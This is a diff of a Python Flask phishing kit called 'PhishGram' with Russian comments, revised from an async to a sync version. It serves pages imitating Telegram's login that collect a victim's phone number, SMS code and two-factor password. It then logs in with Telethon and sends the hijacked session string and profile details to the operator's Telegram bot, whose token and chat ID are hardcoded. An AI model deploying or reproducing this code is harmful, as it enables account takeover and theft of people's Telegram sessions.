@@ -1,262 +1,245 @@
-import os
-import re
-import asyncio
-import threading
-import logging
-from flask import Flask, render_template_string, request, session as flask_session
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeEmptyError
+from flask import Flask, render_template_string, request, session as flask_session, redirect, url_for
+from telethon.sync import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from telethon.sessions import StringSession
 import requests
+import re
+import os
+import uuid
 
 app = Flask(__name__)
-app.secret_key = 'ph1shgram-s3cr3t-k3y'
+app.secret_key = 'ph1shgram_fixed_2026'
 
-# ТВОИ ДАННЫЕ (готово к запуску!)
+# ТВОИ ДАННЫЕ
 API_ID = 37839268
 API_HASH = '02f22349d03ee117dee396f65bcc56da'
 BOT_TOKEN = '8791356428:AAGCZzEnZ5_4YxOMfajeZR4uJzZ9J81VSNg'
 CHAT_ID = '7489815425'
 
-# Хранилище состояний авторизации
+# Состояния
 auth_states = {}
-loop = None
 
-def init_async_loop():
-    global loop
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+def send_to_bot(message):
+    """Отправка в Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": CHAT_ID, 
+            "text": message, 
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
+        }
+        requests.post(url, data=data, timeout=10)
+        print(f"✅ Отправлено в бот: {message[:100]}...")
+    except:
+        print("❌ Ошибка отправки в бот")
 
-async def send_telegram(msg):
-    """Отправка в твой Telegram"""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True}
-    requests.post(url, data=data, timeout=10)
-
-async def capture_session(phone, code, password=None):
-    """Захват реальной сессии"""
+def capture_session(phone, code, password=None):
+    """Захват сессии (sync версия)"""
     try:
         client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
+        client.start()
         
-        if not await client.is_user_authorized():
-            await client.send_code_request(phone)
-            await client.sign_in(phone, code)
+        if not client.is_user_authorized():
+            client.send_code_request(phone)
+            client.sign_in(phone, code)
         
-        if password and not await client.is_user_authorized():
-            await client.sign_in(password=password)
+        if password and not client.is_user_authorized():
+            client.sign_in(password=password)
         
-        # Получаем сессию и инфу
+        # Сессия + инфа
         session_str = client.session.save()
-        me = await client.get_me()
+        me = client.get_me()
         
-        info = f"""🎣 <b>НОВАЯ ТЕЛЕГРАМ СЕССИЯ!</b>
+        info = f"""🎣 <b>🆕 НОВАЯ СЕССИЯ TELEGRAM!</b>
 
 👤 <b>{me.first_name or ''} {me.last_name or ''}</b>
 📱 <b>{phone}</b>
-🆔 <b>{me.id}</b>
-🔗 <b>Username: @{me.username or 'нет'}</b>
+🆔 <b>ID: {me.id}</b>
+🔗 <b>@{me.username or 'нет'}</b>
 
-📋 <b>SESSION:</b>
-<code>{session_str}</code>"""
+💾 <b>SESSION STRING:</b>
+<code>{session_str}</code>
+
+📱 <b>Импорт:</b> StringSession('{session_str}')"""
         
-        await send_telegram(info)
-        await client.disconnect()
+        send_to_bot(info)
+        client.disconnect()
         return True
         
     except PhoneCodeInvalidError:
-        await send_telegram(f"❌ Неверный код для <code>{phone}</code>\nКод: <code>{code}</code>")
+        send_to_bot(f"❌ Неверный код: <code>{phone}</code> | Код: <code>{code}</code>")
     except SessionPasswordNeededError:
-        await send_telegram(f"❌ Нужен пароль 2FA для <code>{phone}</code>\nКод: <code>{code}</code>")
+        return False  # Нужен пароль 2FA
     except Exception as e:
-        await send_telegram(f"❌ Ошибка {phone}: <code>{str(e)}</code>")
+        send_to_bot(f"❌ Ошибка {phone}: <code>{str(e)}</code>")
     return False
-
-def run_async(coro):
-    """Запуск async в Flask"""
-    global loop
-    if loop is None:
-        init_async_loop()
-    return loop.run_until_complete(coro)
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
-        phone = request.form.get('phone', '').strip()
+        phone = request.form['phone'].strip().replace(' ', '').replace('-', '')
         if re.match(r'^\+?\d{10,15}$', phone):
-            phone = phone.replace('+', '').replace(' ', '').replace('-', '')
-            sid = flask_session.get('sid', '0')
-            auth_states[sid] = {'phone': f'+{phone}', 'step': 'code'}
+            phone = f"+{phone.lstrip('+')}"
+            sid = str(uuid.uuid4())[:8]
             flask_session['sid'] = sid
+            auth_states[sid] = {'phone': phone, 'step': 'code'}
             return code_page(phone)
     
-    return render_template_string(HTML_INDEX)
+    return main_page()
 
-@app.route('/code', methods=['GET', 'POST'])
-def code_route():
-    sid = flask_session.get('sid', '0')
-    if sid not in auth_states:
-        return index()
+@app.route('/code', methods=['POST'])
+def code_page_route():
+    sid = flask_session.get('sid')
+    if not sid or sid not in auth_states:
+        return redirect(url_for('index'))
     
-    phone = auth_states[sid]['phone']
+    state = auth_states[sid]
+    phone = state['phone']
+    code = request.form['code'].strip()
     
-    if request.method == 'POST':
-        code = request.form.get('code', '').strip()
-        if len(code) in [5, 6]:
-            auth_states[sid]['code'] = code
-            success = run_async(capture_session(phone, code))
-            
-            if success:
-                del auth_states[sid]
-                return success_page()
-            else:
-                return code_page(phone, error="Неверный код")
+    if len(code) < 5:
+        return code_page(phone, "Код должен содержать 5-6 цифр")
+    
+    state['code'] = code
+    
+    # Пробуем авторизоваться
+    if capture_session(phone, code):
+        del auth_states[sid]
+        del flask_session['sid']
+        return success_page()
+    else:
+        # Проверяем нужен ли 2FA
+        state['step'] = '2fa'
+        return twofa_page(phone)
     
     return code_page(phone)
 
-@app.route('/2fa', methods=['GET', 'POST'])
+@app.route('/2fa', methods=['POST'])
 def twofa_route():
-    sid = flask_session.get('sid', '0')
-    if sid not in auth_states:
-        return index()
+    sid = flask_session.get('sid')
+    if not sid or sid not in auth_states:
+        return redirect(url_for('index'))
     
-    phone = auth_states[sid]['phone']
-    code = auth_states[sid]['code']
+    state = auth_states[sid]
+    phone = state['phone']
+    code = state['code']
+    password = request.form['password']
     
-    if request.method == 'POST':
-        password = request.form.get('password', '')
-        success = run_async(capture_session(phone, code, password))
+    if capture_session(phone, code, password):
         del auth_states[sid]
+        del flask_session['sid']
         return success_page()
     
-    return twofa_page(phone)
+    return twofa_page(phone, "Неверный пароль 2FA")
 
-# HTML ТЕМПЛЕЙТЫ
-HTML_INDEX = """
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>Telegram</title>
+# HTML страницы
+CSS = """
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif}
 body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.container{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);padding:40px;max-width:380px;width:100%}
-.logo{text-align:center;margin-bottom:30px}
-.logo img{width:70px;height:70px}
-h1{color:#0066ff;font-size:24px;font-weight:600;margin-bottom:10px;text-align:center}
-.subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
-input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:.3s;margin-bottom:20px}
-input:focus{outline:none;border-color:#0066ff;box-shadow:0 0 0 3px rgba(0,102,255,.1)}
-button{width:100%;padding:15px;background:#0066ff;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:.3s}
-button:hover{background:#0052cc;transform:translateY(-1px)}
-.phone-box{background:#f8f9fa;padding:15px;border-radius:10px;text-align:center;font-weight:500;margin:20px 0;word-break:break-all}
-.error{color:#e74c3c;font-size:14px;margin-bottom:15px;text-align:center}
-.success{color:#27ae60;font-size:18px;text-align:center;margin:20px 0}
+.box{background:#fff;border-radius:24px;box-shadow:0 24px 48px rgba(0,0,0,.15);padding:48px;max-width:400px;width:100%}
+.logo{text-align:center;margin-bottom:32px}
+.logo svg{width:72px;height:72px;fill:#0088cc}
+h1{color:#1c1c1e;font-size:28px;font-weight:600;margin-bottom:12px;text-align:center}
+.subtext{color:#8e8e93;text-align:center;margin-bottom:32px;font-size:16px;line-height:1.4}
+.form-group{margin-bottom:24px}
+label{display:block;margin-bottom:8px;color:#1c1c1e;font-weight:500;font-size:15px}
+input{width:100%;padding:16px;border:2px solid #e5e5e7;border-radius:16px;font-size:17px;transition:all .2s}
+input:focus{outline:none;border-color:#007aff;box-shadow:0 0 0 4px rgba(0,122,255,.1)}
+.btn{width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:16px;font-size:17px;font-weight:600;cursor:pointer;transition:all .2s}
+.btn:hover{background:#0056b3;transform:translateY(-1px)}
+.phone-display{background:#f2f2f7;padding:16px;border-radius:12px;text-align:center;font-weight:600;margin:24px 0;font-family:monospace}
+.error{color:#ff3b30;font-size:15px;margin-bottom:16px;text-align:center;padding:12px;background:rgba(255,59,48,.1);border-radius:12px}
+.success{color:#34c759;font-size:24px;text-align:center;margin:32px 0}
 </style>
-</head>
-<body>
-<div class="container">
-<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"></div>
-<h1>Добро пожаловать в Telegram</h1>
-<p class="subtitle">Введите номер телефона</p>
-<form method="POST">
-<input type="tel" name="phone" placeholder="+79991234567" required autocomplete="tel">
-<button type="submit">Далее</button>
-</form>
-</div>
-</body>
-</html>
 """
 
-def code_page(phone, error=None):
-    html = f"""
-<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - Код</title>
-""" + CSS_BASE + """
-</head>
-<body>
-<div class="container">
-<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
-<h1>Код подтверждения</h1>
-<p class="subtitle">Отправлен SMS на ваш номер</p>
-<div class="phone-box">{phone}</div>
-"""
-    if error:
-        html += f'<div class="error">{error}</div>'
-    html += f"""
-<form method="POST" action="/code">
-<input type="text" name="code" placeholder="12345" maxlength="6" pattern="\\d{{5,6}}" required autocomplete="one-time-code">
-<button type="submit">Подтвердить</button>
-</form>
-</div>
-</body>
-</html>
-"""
-    return html.format(phone=phone)
-
-def twofa_page(phone):
+def main_page():
     return f"""
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - 2FA</title>
-""" + CSS_BASE + """
-</head>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram Web</title>{CSS}</head>
 <body>
-<div class="container">
-<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
-<h1>Двухфакторная защита</h1>
-<p class="subtitle">Введите пароль 2FA</p>
-<div class="phone-box">{phone}</div>
-<form method="POST" action="/2fa">
-<input type="password" name="password" placeholder="******" required>
-<button type="submit">Войти</button>
+<div class="box">
+<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
+<h1>Telegram</h1>
+<p class="subtext">Продолжите в Telegram Web</p>
+<form method="POST">
+<div class="form-group">
+<label>Номер телефона</label>
+<input type="tel" name="phone" placeholder="+7 999 123-45-67" required>
+</div>
+<button class="btn" type="submit">Далее</button>
 </form>
 </div>
-</body>
-</html>
-""".format(phone=phone)
+</body></html>
+"""
+
+def code_page(phone, error=""):
+    err_html = f'<div class="error">{error}</div>' if error else ""
+    return f"""
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - Код</title>{CSS}</head>
+<body>
+<div class="box">
+<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
+<h1>Подтверждение номера</h1>
+<p class="subtext">Код отправлен на ваш телефон</p>
+{err_html}
+<div class="phone-display">{phone}</div>
+<form method="POST" action="/code">
+<div class="form-group">
+<label>Код из SMS</label>
+<input type="text" name="code" maxlength="6" pattern="[0-9]{{5,6}}" placeholder="12345" required autofocus>
+</div>
+<button class="btn" type="submit">Подтвердить</button>
+</form>
+</div>
+</body></html>
+"""
+
+def twofa_page(phone, error=""):
+    err_html = f'<div class="error">{error}</div>' if error else ""
+    return f"""
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram - 2FA</title>{CSS}</head>
+<body>
+<div class="box">
+<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
+<h1>Двухфакторная защита</h1>
+<p class="subtext">Введите пароль двухэтапной верификации</p>
+<div class="phone-display">{phone}</div>
+{err_html}
+<form method="POST" action="/2fa">
+<div class="form-group">
+<label>Пароль 2FA</label>
+<input type="password" name="password" placeholder="******" required>
+</div>
+<button class="btn" type="submit">Войти</button>
+</form>
+</div>
+</body></html>
+"""
 
 def success_page():
     return f"""
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram</title>
-""" + CSS_BASE + """
-</head>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Telegram</title>{CSS}</head>
 <body>
-<div class="container">
-<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
-<div class="success">✅ Вход выполнен успешно!</div>
-<p style="text-align:center;color:#666;margin:20px 0">Перенаправление через 3 секунды...</p>
-<script>setTimeout(()=>location.href="/",3000)</script>
+<div class="box">
+<div class="logo"><svg viewBox="0 0 48 48"><path d="M24 0C10.7 0 0 10.7 0 24s10.7 24 24 24 24-10.7 24-24S37.3 0 24 0zm11.4 32.3l-2.9-14.5-6.5 6.1-4.8-4.2-5.7 5.7V28c0 .9.1 1.7.4 2.5.5.8 1.2 1.5 2.1 1.9 2.1.9 4.3-.4 5.2-2.5l1.4-5.3 4.1 3.8 8.7-1.1c1.1-.1 2-.9 2.1-2 .1-1.1-.4-2.1-1.4-2.3z"/></svg></div>
+<div class="success">✅ Добро пожаловать!</div>
+<p style="text-align:center;color:#8e8e93;margin:24px 0;font-size:16px">Вход выполнен успешно</p>
+<script>setTimeout(()=>{{
+    window.location.href = '/';
+}}, 2000);</script>
 </div>
-</body>
-</html>
-"""
-
-CSS_BASE = """
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
-body{{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
-.container{{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);padding:40px;max-width:380px;width:100%}}
-.logo{{text-align:center;margin-bottom:30px}}
-.logo img{{width:70px;height:70px}}
-h1{{color:#0066ff;font-size:24px;font-weight:600;margin-bottom:10px;text-align:center}}
-.subtitle{{color:#666;text-align:center;margin-bottom:30px;font-size:14px}}
-input{{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:.3s;margin-bottom:20px}}
-input:focus{{outline:none;border-color:#0066ff;box-shadow:0 0 0 3px rgba(0,102,255,.1)}}
-button{{width:100%;padding:15px;background:#0066ff;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:.3s}}
-button:hover{{background:#0052cc;transform:translateY(-1px)}}
-.phone-box{{background:#f8f9fa;padding:15px;border-radius:10px;text-align:center;font-weight:500;margin:20px 0;word-break:break-all}}
-.error{{color:#e74c3c;font-size:14px;margin-bottom:15px;text-align:center}}
-.success{{color:#27ae60;font-size:18px;text-align:center;margin:20px 0}}
-</style>
+</body></html>
 """
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"🚀 PhishGram запущен на порту {port}")
-    print(f"🌐 Ссылка: http://localhost:{port}")
-    app.run(host='0.0.0.0', port=port, debug=False)
+    debug = os.environ.get('DEBUG', 'false').lower() == 'true'
+    print("🚀 PhishGram v2.0 - Готов к работе!")
+    print(f"🌐 http://0.0.0.0:{port}")
+    app.run(host='0.0.0.0', port=port, debug=debug)
